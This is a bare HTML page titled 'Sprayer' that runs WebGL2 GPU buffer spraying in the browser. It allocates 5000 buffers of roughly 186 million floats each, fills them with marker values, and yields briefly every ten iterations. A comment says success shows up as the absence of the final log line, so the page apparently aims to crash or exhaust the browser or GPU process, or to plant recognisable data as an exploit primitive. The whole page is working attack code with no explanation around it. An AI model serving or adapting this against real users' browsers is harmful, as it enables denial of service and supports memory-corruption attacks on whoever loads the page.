<!DOCTYPE html>
<html>
<head><title>Sprayer</title></head>
<body>
  <h3>Sprayer</h3>
  <script>
    
    const canvas = document.createElement("canvas");
    canvas.width = 10;
    canvas.height = 10;
    document.body.appendChild(canvas);
    const gl = canvas.getContext("webgl2", {failIfMajorPerformanceCaveat: false});

    const SPRAY_COUNT = 5000;    
    const BUFSIZE = 0xB16B00B;  
    const buffers = [];

    async function sprayBuffersChunked() {
      for (let i = 0; i < SPRAY_COUNT; i++) {
        const marker = 0xDAB00B5 + i;
        const arr = new Float32Array(BUFSIZE).fill(marker);
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        gl.bufferData(gl.ARRAY_BUFFER, arr, gl.STATIC_DRAW);
        buffers.push({marker, buf});

        if (i % 10 === 0) {
          await new Promise(r => setTimeout(r, 10));
        }
      }
      console.log(`Sprayed ${SPRAY_COUNT} buffers of size ${BUFSIZE} floats.`); // Only logs if it DOESN'T work.
    }

    sprayBuffersChunked();
  </script>
</body>
</html>
